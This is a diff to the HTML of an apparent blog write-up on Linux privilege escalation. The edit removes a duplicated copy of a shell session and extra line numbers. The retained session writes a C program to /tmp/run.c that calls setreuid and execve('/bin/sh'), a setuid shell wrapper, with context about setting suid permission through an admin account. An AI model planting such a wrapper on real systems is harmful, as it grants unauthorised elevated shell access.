@@ -458,19 +458,6 @@ and set suid permission using admin&rsquo;s account:</p>
 <span class='line-number'>11</span>
 <span class='line-number'>12</span>
 <span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ echo '#include &lt;stdio.h>
 </span><span class='line'>#include &lt;stdlib.h>
 </span><span class='line'>#include &lt;sys/types.h>
@@ -483,19 +470,6 @@ and set suid permission using admin&rsquo;s account:</p>
 </span><span class='line'>
 </span><span class='line'>   return 0;
 </span><span class='line'>}
-</span><span class='line'>' > /tmp/run.cecho '#include &lt;stdio.h>
-</span><span class='line'>> #include &lt;stdlib.h>
-</span><span class='line'>> #include &lt;sys/types.h>
-</span><span class='line'>> #include &lt;unistd.h>
-</span><span class='line'>>
-</span><span class='line'>> int main()
-</span><span class='line'>> {
-</span><span class='line'>>    setreuid(geteuid(),geteuid());
-</span><span class='line'>>    execve("/bin/sh", NULL, NULL);
-</span><span class='line'>>
-</span><span class='line'>>    return 0;
-</span><span class='line'>> }
-</span><span class='line'>>
 </span><span class='line'>' > /tmp/run.c</span></code></pre></td></tr></table></div></figure>
 
 
